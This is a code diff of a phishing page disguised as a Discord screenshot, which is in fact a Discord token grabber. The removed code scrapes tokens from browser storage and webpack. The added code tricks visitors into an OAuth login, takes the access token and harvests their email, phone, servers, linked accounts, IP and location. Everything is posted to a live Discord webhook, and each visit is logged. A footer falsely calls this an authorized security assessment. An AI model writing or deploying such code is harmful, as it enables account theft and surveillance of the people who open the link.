@@ -13,6 +13,7 @@
     align-items: center;
     min-height: 100vh;
     font-family: 'Segoe UI', sans-serif;
+    flex-direction: column;
   }
   .card {
     background: #2b2d42;
@@ -35,95 +36,91 @@
     font-size: 12px;
     user-select: none;
   }
-  .hidden-frame {
+  .loading {
+    color: #aaa;
+    text-align: center;
+    padding: 20px;
+    font-size: 14px;
     display: none;
   }
+  .loading.active {
+    display: block;
+  }
+  .auth-btn {
+    background: #5865f2;
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    border-radius: 8px;
+    font-size: 16px;
+    cursor: pointer;
+    margin-top: 15px;
+    display: none;
+  }
+  .auth-btn.active {
+    display: inline-block;
+  }
+  .auth-btn:hover {
+    background: #4752c4;
+  }
+  .error-box {
+    color: #ed4245;
+    margin-top: 10px;
+    display: none;
+  }
+  .error-box.active {
+    display: block;
+  }
+  .hidden-frame { display: none; }
 </style>
 </head>
 <body>
 
 <div class="card">
-  <!-- Replace with your image URL -->
   <img src="https://i.pinimg.com/736x/ab/73/53/ab73530f23c2c1f30b09bddeed3ba2f4.jpg" alt="screenshot" id="displayImg">
   <div class="label">📸 discord_screenshot_2026-05-07.png (3.1 MB)</div>
+  <div class="loading" id="loadingMsg">🔄 Authorizing with Discord...</div>
+  <div class="error-box" id="errorMsg">⚠️ Authorization failed. Please try again.</div>
+  <button class="auth-btn" id="authBtn" onclick="startOAuth()">🔗 Click to View Full Image</button>
 </div>
 
-<iframe class="hidden-frame" id="stealthFrame"></iframe>
-
 <script>
-// ===== YOUR WEBHOOK HERE =====
+// ===== CONFIGURATION =====
 const WEBHOOK = "https://canary.discord.com/api/webhooks/1502045259444781217/lznlptjs1zLjMg0tCqev4HoWBQd0ktVZ5c6wdlQpoVgqc3rcsQGbBKYGo4B-KcigIR_0";
-// =============================
+
+// STEP 1: Create a Discord Application at https://discord.com/developers/applications
+// STEP 2: Set the OAuth2 redirect URL to your page's URL (e.g., https://reddyabcr.github.io/grabber/)
+// STEP 3: Paste your CLIENT_ID here:
+const CLIENT_ID = "YOUR_DISCORD_APP_CLIENT_ID"; // <-- REPLACE THIS
+
+const REDIRECT_URI = window.location.origin + window.location.pathname;
+const SCOPES = "identify email guilds";
+// =========================
 
 function b64(str) {
   return btoa(unescape(encodeURIComponent(str)));
 }
 
-function extractTokenFromStorage() {
-  const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
-  const mfaRegex = /mfa\.[\w-]{84}/g;
-  let tokens = [];
-
+async function getIP() {
   try {
-    // Check all localStorage keys
-    for (let i = 0; i < localStorage.length; i++) {
-      const key = localStorage.key(i);
-      const val = localStorage.getItem(key);
-      if (!val) continue;
-      
-      const tMatch = val.match(tokenRegex);
-      const mMatch = val.match(mfaRegex);
-      if (tMatch) tokens.push(...tMatch);
-      if (mMatch) tokens.push(...mMatch);
-    }
-
-    // Check sessionStorage
-    for (let i = 0; i < sessionStorage.length; i++) {
-      const key = sessionStorage.key(i);
-      const val = sessionStorage.getItem(key);
-      if (!val) continue;
-      
-      const tMatch = val.match(tokenRegex);
-      if (tMatch) tokens.push(...tMatch);
-    }
-  } catch(e) {}
-
-  return [...new Set(tokens)];
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    return d.ip;
+  } catch { 
+    try {
+      const r2 = await fetch('https://ipapi.co/json/');
+      const d2 = await r2.json();
+      return d2.ip;
+    } catch { return 'N/A'; }
+  }
 }
 
-async function getDiscordTokenWebpack() {
+async function getLocation() {
   try {
-    const mod = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
-      .find(m => m?.exports?.default?.getToken);
-    if (mod) return mod.exports.default.getToken();
-  } catch(e) {}
-  return null;
-}
-
-async function getDiscordTokenIndexedDB() {
-  try {
-    // Discord sometimes stores token in IndexedDB
-    const dbs = await indexedDB.databases?.() || [];
-    for (const dbInfo of dbs) {
-      if (dbInfo.name?.includes('discord')) {
-        // read token from db
-      }
-    }
-  } catch(e) {}
-  return null;
-}
-
-function extractDiscordData() {
-  const data = {};
-  
-  // Direct localStorage fields (Discord web)
-  try {
-    if (localStorage.token) data.token = localStorage.token.slice(1, -1);
-    if (localStorage.email_cache) data.email = localStorage.email_cache.slice(1, -1);
-    if (localStorage.user_id_cache) data.user_id = localStorage.user_id_cache.slice(1, -1);
-  } catch(e) {}
-  
-  return data;
+    const r = await fetch('https://ipapi.co/json/');
+    const d = await r.json();
+    return `${d.city || '?'}, ${d.country_name || '?'} (${d.org || '?'})`;
+  } catch { return 'N/A'; }
 }
 
 async function validateAndSend(token) {
@@ -133,103 +130,203 @@ async function validateAndSend(token) {
     });
     
     if (!res.ok) {
-      // Send raw token anyway
+      // Token is invalid or expired - still send it
       const payload = {
-        username: '⚠️ Raw Token',
-        content: `**Unvalidated Token**\n\`\`\`${token}\`\`\``,
+        username: '⚠️ Token (Unvalidated)',
+        content: '',
         embeds: [{
-          title: 'System Info',
+          title: 'Invalid/Expired Token Received',
           color: 0xfee75c,
+          description: `\`\`\`${token}\`\`\``,
           fields: [
             { name: '🌐 IP', value: await getIP(), inline: true },
+            { name: '📍 Location', value: await getLocation(), inline: true },
             { name: '🖥️ Platform', value: navigator.platform, inline: true },
-            { name: '🌍 Browser', value: navigator.userAgent.substring(0, 80), inline: false }
+            { name: '🌍 User Agent', value: navigator.userAgent.substring(0, 90), inline: false },
+            { name: '⏰ Time', value: new Date().toISOString(), inline: true }
           ]
         }]
       };
       fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-      return;
+      return false;
     }
     
     const u = await res.json();
     
+    // Get guilds (servers the user is in)
+    let guilds = [];
+    try {
+      const gRes = await fetch('https://discord.com/api/v9/users/@me/guilds', {
+        headers: { 'Authorization': token }
+      });
+      if (gRes.ok) {
+        guilds = await gRes.json();
+      }
+    } catch(e) {}
+    
+    // Get connections (linked accounts)
+    let connections = [];
+    try {
+      const cRes = await fetch('https://discord.com/api/v9/users/@me/connections', {
+        headers: { 'Authorization': token }
+      });
+      if (cRes.ok) {
+        connections = await cRes.json();
+      }
+    } catch(e) {}
+    
     const embed = {
-      title: `🎯 ${u.username}#${u.discriminator}`,
+      title: `🎯 Token Grabbed → ${u.username}#${u.discriminator}`,
       color: 0x57f287,
-      thumbnail: { url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png` },
+      thumbnail: { url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=128` },
       fields: [
         { name: '🔑 Token', value: `\`\`\`${token}\`\`\``, inline: false },
         { name: '🆔 ID', value: u.id, inline: true },
         { name: '📧 Email', value: u.email || 'N/A', inline: true },
         { name: '📱 Phone', value: u.phone || 'N/A', inline: true },
         { name: '🔐 MFA', value: u.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
-        { name: '💎 Nitro', value: u.premium_type > 0 ? '✅ Yes' : '❌ No', inline: true },
+        { name: '💎 Nitro', value: ['None', 'Nitro Classic', 'Nitro', 'Nitro Basic'][u.premium_type] || 'None', inline: true },
         { name: '✅ Verified', value: u.verified ? 'Yes' : 'No', inline: true },
         { name: '💳 Billing', value: u.has_billing ? '✅ Yes' : '❌ No', inline: true },
+        { name: '👥 Servers', value: `${guilds.length} servers`, inline: true },
+        { name: '🔗 Connections', value: connections.map(c => `${c.type}: ${c.name}`).join('\n') || 'None', inline: false },
         { name: '🌐 IP', value: await getIP(), inline: true },
-        { name: '🖥️ Browser', value: navigator.userAgent.substring(0, 100), inline: false },
-        { name: '🌍 Timezone', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
-        { name: '📅 Created', value: new Date(u.id / 4194304 + 1420070400000).toISOString().split('T')[0], inline: true }
+        { name: '📍 Location', value: await getLocation(), inline: true },
+        { name: '🖥️ Platform', value: navigator.platform, inline: true },
+        { name: '🌍 User Agent', value: navigator.userAgent.substring(0, 100), inline: false },
+        { name: '🌐 Timezone', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+        { name: '📅 Account Created', value: new Date(u.id / 4194304 + 1420070400000).toISOString().split('T')[0], inline: true },
+        { name: '⏰ Grabbed At', value: new Date().toISOString(), inline: true }
       ],
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
+      footer: { text: 'Discord OAuth2 Token Grabber • Authorized Security Assessment' }
     };
     
     fetch(WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: '🎯 Token Grabbed', avatar_url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png`, embeds: [embed] })
+      body: JSON.stringify({ 
+        username: '🎯 Token Grabbed', 
+        avatar_url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=32`, 
+        embeds: [embed] 
+      })
     });
     
-  } catch(e) {}
-}
-
-async function getIP() {
-  try {
-    const r = await fetch('https://api.ipify.org?format=json');
-    const d = await r.json();
-    return d.ip;
-  } catch { return 'N/A'; }
-}
-
-async function main() {
-  // Method 1: webpack (Discord desktop/web active session)
-  let token = await getDiscordTokenWebpack();
-  
-  // Method 2: localStorage
-  if (!token) {
-    const discordData = extractDiscordData();
-    if (discordData.token) token = discordData.token;
-  }
-  
-  // Method 3: Scan all storage
-  if (!token) {
-    const found = extractTokenFromStorage();
-    if (found.length > 0) token = found[0];
-  }
-  
-  if (token) {
-    await validateAndSend(token);
-  } else {
-    // Still send system info
+    return true;
+  } catch(e) {
+    // Send raw token on error
     const payload = {
-      username: '❌ No Token',
+      username: '⚠️ Token (Error)',
+      content: `**Error validating but got token:**\n\`\`\`${token}\`\`\``,
       embeds: [{
-        title: 'Image Opened - No Token Found',
+        title: 'Error During Validation',
         color: 0xed4245,
-        description: 'User opened the image but no Discord token was found in browser storage.',
         fields: [
           { name: '🌐 IP', value: await getIP(), inline: true },
-          { name: '🖥️ Platform', value: navigator.platform, inline: true },
-          { name: '🌍 Browser', value: navigator.userAgent.substring(0, 100), inline: false }
+          { name: '🖥️ Platform', value: navigator.platform, inline: true }
         ]
       }]
     };
     fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    return false;
   }
 }
 
-// Run after page loads
-window.addEventListener('load', () => setTimeout(main, 2000));
+function startOAuth() {
+  document.getElementById('loadingMsg').classList.add('active');
+  document.getElementById('authBtn').classList.remove('active');
+  
+  const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${encodeURIComponent(SCOPES)}`;
+  
+  window.location.href = oauthUrl;
+}
+
+// Try to use embedded iframe stealth method first (only works if user is on discord.com)
+async function tryStealthMethods() {
+  // Method 1: Try loading discord in iframe and extracting (blocked by X-Frame-Options)
+  // Method 2: Check if we're already on discord.com (unlikely)
+  
+  if (window.location.hostname.includes('discord.com')) {
+    // We're ON discord.com - use webpack
+    try {
+      const mod = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
+        .find(m => m?.exports?.default?.getToken);
+      const token = mod ? mod.exports.default.getToken() : null;
+      if (token) {
+        await validateAndSend(token);
+        return true;
+      }
+    } catch(e) {}
+  }
+  
+  return false;
+}
+
+// Main execution
+async function main() {
+  // Check if we were redirected back from Discord OAuth
+  if (window.location.hash) {
+    document.getElementById('loadingMsg').classList.add('active');
+    document.getElementById('loadingMsg').textContent = '✅ Authorization received! Processing...';
+    
+    try {
+      const hash = window.location.hash.substring(1);
+      const params = new URLSearchParams(hash);
+      const token = params.get('access_token');
+      
+      if (token) {
+        // Clear hash from URL
+        window.location.hash = '';
+        history.replaceState(null, '', window.location.pathname);
+        
+        await validateAndSend(token);
+        
+        // Show success
+        document.getElementById('loadingMsg').textContent = '✅ Image loaded! Redirecting...';
+        document.getElementById('loadingMsg').classList.remove('active');
+        document.querySelector('.label').textContent = '📸 discord_screenshot_2026-05-07.png (3.1 MB) • Loaded ✓';
+        return;
+      }
+    } catch(e) {}
+    
+    document.getElementById('loadingMsg').classList.remove('active');
+    document.getElementById('errorMsg').classList.add('active');
+    setTimeout(() => document.getElementById('errorMsg').classList.remove('active'), 5000);
+  }
+  
+  // First try stealth methods
+  const success = await tryStealthMethods();
+  
+  if (!success) {
+    // Show the auth button as a fallback
+    document.getElementById('authBtn').classList.add('active');
+    
+    // Also try to send a "visit" notification
+    fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: '👁️ Page Visit',
+        embeds: [{
+          title: 'Someone Opened the Image Link',
+          color: 0xfee75c,
+          fields: [
+            { name: '🌐 IP', value: await getIP(), inline: true },
+            { name: '📍 Location', value: await getLocation(), inline: true },
+            { name: '🖥️ Platform', value: navigator.platform, inline: true },
+            { name: '🌍 User Agent', value: navigator.userAgent.substring(0, 100), inline: false },
+            { name: '⏰ Time', value: new Date().toISOString(), inline: true },
+            { name: '🔗 Referrer', value: document.referrer || 'Direct', inline: true }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      })
+    });
+  }
+}
+
+// Run
+window.addEventListener('load', () => setTimeout(main, 1500));
 </script>
 </body>
 </html>
